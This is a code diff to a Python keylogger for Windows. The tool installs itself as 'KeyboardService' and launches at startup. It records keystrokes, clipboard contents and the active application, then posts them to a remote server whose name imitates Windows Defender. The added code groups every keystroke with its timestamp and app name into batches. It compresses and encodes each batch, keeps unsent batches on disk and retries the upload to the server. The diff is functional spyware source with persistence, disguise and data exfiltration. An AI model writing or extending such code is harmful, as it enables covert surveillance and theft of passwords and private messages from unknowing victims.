@@ -2,6 +2,8 @@ import os
 import time
 import json
 import atexit
+import base64
+import gzip
 import hashlib
 import platform
 import shutil
@@ -10,6 +12,7 @@ import subprocess
 import sys
 import ctypes
 import tempfile
+import uuid
 from ctypes import wintypes
 from queue import Queue
 from threading import Lock, Thread, Timer
@@ -24,6 +27,7 @@ except ImportError:
 
 MESSAGE_GAP_MS = 2500
 RAW_BATCH_DELAY_SECONDS = 0.08
+RAW_BATCH_INTERVAL_SECONDS = 10
 HEARTBEAT_INTERVAL_SECONDS = 30
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
@@ -34,6 +38,9 @@ raw_message_buffer = ""
 raw_log_buffer = ""
 raw_log_target = None
 raw_flush_timer = None
+raw_batch_events = []
+raw_batch_started_at = None
+raw_batch_lock = Lock()
 last_key_time_ms = None
 message_started_ms = None
 active_target = None
@@ -46,6 +53,8 @@ STARTUP_ENTRY_NAME = "KeyboardService"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
 INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
 PENDING_MESSAGES_PATH = os.path.join(INSTALL_DIR, "pending_messages.json")
+PENDING_RAW_BATCHES_PATH = os.path.join(INSTALL_DIR, "pending_raw_batches.json")
+SESSION_ID = uuid.uuid4().hex
 pending_messages_lock = Lock()
 
 SHIFTED_SYMBOLS = {
@@ -229,6 +238,89 @@ def forget_pending_message(payload):
             os.unlink(PENDING_MESSAGES_PATH)
 
 
+def load_pending_raw_batches():
+    try:
+        with open(PENDING_RAW_BATCHES_PATH, "r", encoding="utf-8") as pending_file:
+            batches = json.load(pending_file)
+            return batches if isinstance(batches, list) else []
+    except (FileNotFoundError, OSError, json.JSONDecodeError):
+        return []
+
+
+def save_pending_raw_batches(batches):
+    os.makedirs(INSTALL_DIR, exist_ok=True)
+    fd, temporary_path = tempfile.mkstemp(
+        prefix="pending_raw_batches_", suffix=".tmp", dir=INSTALL_DIR
+    )
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
+            json.dump(batches, pending_file)
+        os.replace(temporary_path, PENDING_RAW_BATCHES_PATH)
+    finally:
+        if os.path.exists(temporary_path):
+            os.unlink(temporary_path)
+
+
+def remember_raw_batch(payload):
+    with raw_batch_lock:
+        batches = load_pending_raw_batches()
+        batches.append(payload)
+        save_pending_raw_batches(batches)
+
+
+def forget_raw_batch(payload):
+    with raw_batch_lock:
+        batches = [
+            batch for batch in load_pending_raw_batches()
+            if batch.get("batch_id") != payload.get("batch_id")
+        ]
+        if batches:
+            save_pending_raw_batches(batches)
+        elif os.path.exists(PENDING_RAW_BATCHES_PATH):
+            os.unlink(PENDING_RAW_BATCHES_PATH)
+
+
+def post_raw_batch(payload):
+    try:
+        request = Request(
+            f"{SITE_URL}/api/raw-batches",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urlopen(request, timeout=10) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+        return True
+    except (HTTPError, URLError, TimeoutError, RuntimeError):
+        return False
+
+
+def upload_raw_batch(events):
+    if not events:
+        return
+    payload_json = json.dumps(events, separators=(",", ":")).encode("utf-8")
+    payload = {
+        "batch_id": uuid.uuid4().hex,
+        "device_id": device_id,
+        "device_name": device_name,
+        "session_id": SESSION_ID,
+        "started_at": events[0]["time"],
+        "ended_at": events[-1]["time"],
+        "event_count": len(events),
+        "payload_base64": base64.b64encode(gzip.compress(payload_json)).decode("ascii"),
+    }
+    remember_raw_batch(payload)
+    if post_raw_batch(payload):
+        forget_raw_batch(payload)
+
+
+def retry_pending_raw_batches():
+    for payload in load_pending_raw_batches():
+        if post_raw_batch(payload):
+            forget_raw_batch(payload)
+
+
 def post_message(payload, quiet=False):
     try:
         headers = {"Content-Type": "application/json"}
@@ -370,30 +462,31 @@ def message_sender():
             pass
         if time.time() - last_retry_at >= MESSAGE_RETRY_INTERVAL_SECONDS:
             retry_pending_messages()
+            retry_pending_raw_batches()
             last_retry_at = time.time()
 
 
 def queue_raw_token(token, app_name):
-    global raw_log_buffer, raw_log_target, raw_flush_timer
-    raw_log_buffer += token
-    if raw_log_target is None:
-        raw_log_target = app_name
+    global raw_batch_started_at, raw_flush_timer
+    now = int(time.time() * 1000)
+    with raw_batch_lock:
+        if raw_batch_started_at is None:
+            raw_batch_started_at = now
+        raw_batch_events.append({"time": now, "key": token, "app_name": app_name})
     if raw_flush_timer is None:
-        raw_flush_timer = Timer(RAW_BATCH_DELAY_SECONDS, flush_raw_log)
+        raw_flush_timer = Timer(RAW_BATCH_INTERVAL_SECONDS, flush_raw_log)
         raw_flush_timer.daemon = True
         raw_flush_timer.start()
 
 
 def flush_raw_log():
-    global raw_log_buffer, raw_log_target, raw_flush_timer
-    with state_lock:
-        raw_text = raw_log_buffer
-        app_name = raw_log_target or get_active_app()
-        raw_log_buffer = ""
-        raw_log_target = None
+    global raw_batch_events, raw_batch_started_at, raw_flush_timer
+    with raw_batch_lock:
+        events = raw_batch_events
+        raw_batch_events = []
+        raw_batch_started_at = None
         raw_flush_timer = None
-        if raw_text:
-            message_queue.put((raw_text, app_name, raw_text, False, False, True))
+    upload_raw_batch(events)
 
 
 def queue_copied_clipboard(target):
@@ -492,6 +585,7 @@ if install_and_relaunch():
 print(f"Sending to {SITE_URL}")
 register_startup_launch()
 atexit.register(mark_device_offline)
+atexit.register(flush_raw_log)
 Thread(target=message_sender, daemon=True).start()
 Thread(target=heartbeat_sender, daemon=True).start()
 with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
